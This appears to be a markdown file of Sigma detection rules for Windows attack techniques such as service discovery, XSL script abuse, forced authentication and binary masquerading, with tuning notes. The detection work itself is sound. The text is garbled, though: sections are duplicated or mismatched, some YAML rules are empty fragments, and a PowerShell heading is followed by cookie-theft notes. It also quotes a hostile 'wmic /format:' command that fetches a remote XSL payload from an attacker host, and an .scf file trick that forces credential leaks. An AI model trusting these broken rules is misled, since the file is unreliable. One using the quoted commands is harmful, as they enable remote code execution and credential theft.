FILE: discovery/AN2076-T1007-DET0933.md
RULE TITLE: System Service Enumeration (AN2076)
==========================================================================================

### 1. Technique Breakdown: T1007

* What it is: System Service Discovery. Adversaries may try to get information about registered local system services.
* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
* Coverage Check:
  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
  - NIDS (Suricata + Zeek): NO. Host-local discovery.
* Log Sources Covered:
  - Sysmon Event ID 1 (process_creation)
* Log Sources Missing / Unused:
  - None.

---

### 2. Custom Sigma Rule

#### Rule 1 of 1: System Service Enumeration
Detects command-line utilities enumerating installed services on a Windows system.

```yaml
title: System Service Enumeration (AN2076)
id: cdef9001-a189-4db8-bb9a-7c9802cf0040
status: experimental
description: Detects the execution of sc.exe or net.exe to enumerate system services. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
author: Krishna Gupta
date: 2026-06-30
logsource:
    category: process_creation
    product: windows
detection:
    selection_images:
        Image|endswith:
            - '\sc.exe'
            - '\net.exe'
            - '\net1.exe'
    selection_ofn:
        OriginalFileName:
            - 'sc.exe'
            - 'net.exe'
            - 'net1.exe'
    selection_cli:
        CommandLine|contains:
            - ' query'
    condition: (selection_images or selection_ofn) and selection_cli
fields:
    - Image
    - OriginalFileName
    - CommandLine
    - User
falsepositives:
    - IT administrators querying service status during troubleshooting.
level: medium
tags:
    - attack.discovery
    - attack.t1007
    - analytic.an2076
    - detection.det0933
```

---

### 3. Blind Spots & Tuning (The "Problems")

* Problem 1: Automated Health Checks
  * The Issue: Monitoring agents frequently query service status.
  * The Fix: Add a `filter_agents` block to whitelist the parent processes of known monitoring agents (e.g. `monitoringhost.exe`).
* Problem 2: API Evasion
  * The Issue: If the attacker uses direct Win32 API calls (e.g. `EnumServicesStatusEx`) via a custom executable, this process creation rule will miss it.
  * The Fix: Requires API hooking or advanced EDR telemetry for Win32 API monitoring.
* Problem 3: OriginalFileName availability
  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.

* Problem 2: EDR Telemetry Gaps

### 3. Blind Spots & Tuning (The "Problems")

* Problem 1: High False Positive Rate
  * The Issue: `ipconfig /all` is one of the most commonly executed commands by users and helpdesk personnel.
  * The Fix: This rule is marked `level: low`. It should be used as a building block in a correlation rule (e.g. triggering an alert only if multiple discovery commands run within a 5-minute window).
* Problem 2: Substring Breadth in CLI Flags
  * The Issue: Short flags like `-a` and `-n` appear in many unrelated command lines.
  * The Fix: If promoted past `level: low`, scope CLI flags per-tool using separate `selection_*` blocks per binary rather than a shared OR'd pool.
* Problem 3: Native API
  * The Issue: Attackers using `GetAdaptersInfo` API via C++ malware will not spawn these standard utilities.
  * The Fix: Rely on network-based anomaly detection (NIDS) for unusual internal scanning behavior resulting from the discovery.
* Problem 4: OriginalFileName availability
  * The Issue: OriginalFileName is only present in Sysmon logs when PE metadata is intact; packed or hollowed binaries may lack it.
  * The Fix: Treat the Image and OriginalFileName paths as complementary — either catch alone is sufficient.

* What it is: XSL Script Processing. Adversaries may bypass application control and process malicious XSL scripts using wmic.exe (via /format or xsl: arguments) or msxsl.exe to execute embedded JScript or VBScript payloads.
* Log Source Requirements: Sysmon Process Creation (Event ID 1) / Windows Event ID 4688.
* Coverage Check:

  - Sysmon Event ID 1 (process_creation)
* Log Sources Missing / Unused:
  - None.

---

### 2. Custom Sigma Rule

#### Rule 1 of 1: XSL Script Execution via WMIC or MSXSL
Detects wmic.exe with /format: pointing to remote or unusual XSL files, or msxsl.exe execution.

```yaml
title: XSL Script Execution via WMIC or MSXSL (AN2102)
id: 5d9f2b38-7c4e-4a91-b6d3-8e1a5f72c946
status: experimental
description: "Detects wmic.exe using /format: to load XSL stylesheets (which can execute embedded scripts) or direct msxsl.exe execution. Both bypass application control policies. Includes OriginalFileName to resist binary-rename evasion."
author: Krishna Gupta
date: 2026-07-01
logsource:
    category: process_creation
    product: windows
detection:
    selection_wmic:
        Image|endswith:
            - '\wmic.exe'
    selection_wmic_ofn:
        OriginalFileName: 'wmic.exe'
    selection_wmic_cli:
        CommandLine|contains:
            - '/format:'
            - 'xsl:'
    selection_msxsl:
        Image|endswith:
            - '\msxsl.exe'
    selection_msxsl_ofn:
        OriginalFileName: 'msxsl.exe'
    filter_local_format:
        CommandLine|re: '(?i)/format:(list|table|csv|hform|htable|value|rawxml|xml|mof|textvaluelist)(?:\s|$)'
    condition: (((selection_wmic or selection_wmic_ofn) and selection_wmic_cli) or selection_msxsl or selection_msxsl_ofn) and not filter_local_format
fields:
    - Image
    - OriginalFileName
    - CommandLine
    - User
falsepositives:
    - Legitimate WMIC output formatting using built-in /format: switches for reporting.
level: high
tags:
    - attack.defense_evasion
    - attack.t1220
    - analytic.an2102
    - detection.det0959
```

---

### 3. Blind Spots & Tuning (The "Problems")

* Problem 1: Local XSL File
  * The Issue: Attackers may drop the XSL file locally first and reference it by local path, which looks less suspicious than a URL.
  * The Fix: The filter_local_format excludes only the built-in named formats. Custom local XSL file paths (e.g., /format:C:\temp\evil.xsl) will still trigger.
* Problem 2: Remote URL Fetching
  * The Issue: wmic /format:http://attacker.com/evil.xsl fetches and executes remotely — the HTTP request may be the only non-host-based indicator.
  * The Fix: Correlate this rule with Zeek HTTP logs showing wmic.exe as the requesting process for .xsl files.
* Problem 3: OriginalFileName availability
  * The Issue: OriginalFileName is only present when PE metadata is intact.
  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.

```yaml
title: Credential String Search in Files and Registry (AN2103)
```

Detects the creation of .scf files with UNC icon paths or net use commands to attacker-controlled shares.

```yaml
title: Forced Authentication via UNC Path or SCF File Creation (AN2104)

    selection_net:

            - '\net1.exe'

            - 'net.exe'
```

### 3. Blind Spots & Tuning (The "Problems")

* Problem 1: .scf File Drop via File Create
  * The Issue: .scf files with `IconFile=\\attacker\share` dropped in monitored directories (e.g., Downloads) force authentication when the folder is opened. This requires Sysmon Event ID 11 (FileCreate) detection, not process creation.

  * The Issue: HTTP/WebDAV-based forced authentication (e.g., \\attacker\webdav via file:// in a browser) does not involve net.exe at all.

  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.

---

### 2. Custom Sigma Rule

#### Rule 1 of 1: System Binary Name Used from Non-Standard Path
Detects processes using the name of a critical Windows system binary executing from a non-system directory, indicating masquerading.

```yaml
title: System Binary Name Used from Non-Standard Path (AN2105)
id: 4c1a9f53-8b2e-4d67-a3c7-9f5b8e24c719
status: experimental
description: Detects well-known Windows system binary names (svchost, lsass, explorer, csrss) executing from paths outside %SystemRoot% or %SystemRoot%\System32, indicating masquerading. Does NOT use OriginalFileName as the attack is specifically about abusing a trusted binary name.
author: Krishna Gupta
date: 2026-07-01
logsource:

detection:
    selection_suspicious_names:
        Image|endswith:
            - '\svchost.exe'
            - '\lsass.exe'
            - '\explorer.exe'
            - '\csrss.exe'
            - '\winlogon.exe'
            - '\services.exe'
            - '\smss.exe'
    filter_legitimate_paths:
        Image|startswith:
            - 'C:\Windows\'
    condition: selection_suspicious_names and not filter_legitimate_paths
fields:
    - Image
    - CommandLine
    - ParentImage
    - User
falsepositives:
    - Security tools or application sandboxes that legitimately run renamed copies of Windows binaries for testing.
level: critical
tags:
    - attack.defense_evasion
    - attack.t1036
    - analytic.an2105
    - detection.det0962
```

---

### 3. Blind Spots & Tuning (The "Problems")

* Problem 1: Legitimate System Path Variations
  * The Issue: Some Windows update processes and repair tools temporarily run system binaries from non-standard paths (e.g., WinSxS, servicing directories).
  * The Fix: Extend filter_legitimate_paths to include `C:\Windows\WinSxS\` and `C:\Windows\Servicing\` if false positives are observed.
* Problem 2: OriginalFileName Mismatch
  * The Issue: A more complete masquerade check would also verify that svchost.exe has `OriginalFileName: svchost.exe` — a binary with a different OriginalFileName would have been caught by Sprint 1/2 OFN rules already.
  * The Fix: Add an AND condition requiring `OriginalFileName != <expected>` for completeness if the SIEM supports it.
* Problem 3: Case Sensitivity
  * The Issue: Windows paths are case-insensitive; `C:\windows\system32\svchost.exe` is legitimate but might not match `C:\Windows\System32\` startswith exactly.
  * The Fix: Ensure case-insensitive path matching is enabled in your SIEM's Sigma translation backend.

```yaml
title: PowerShell Encoded Command or Heavy Obfuscation Execution (AN2106)

status: experimental
```

### 3. Blind Spots & Tuning (The "Problems")

* Problem 1: In-Memory Cookie Theft
  * The Issue: Advanced tools read cookie databases directly from process memory (Mimikatz-style) without touching the file on disk.
  * The Fix: Requires memory forensics or EDR-level process memory scanning.
* Problem 2: Custom Stealer Binaries
  * The Issue: Commodity stealers (Vidar, Raccoon, RedLine) are custom binaries that directly read cookie files without invoking sqlite3.exe or Python.
  * The Fix: Detect the stealer binary via hash/YARA, or monitor for suspicious file reads of Cookies paths using Sysmon Event ID 11 with path filters.
* Problem 3: Browser Lock Files
  * The Issue: Chrome locks its Cookies database while running. Stealers often copy the file first — detectable via Sysmon Event ID 11 (FileCreate) of Cookies in a temp directory.
  * The Fix: Add a companion FileCreate rule for Cookies file creation in %TEMP% or user temp directories.
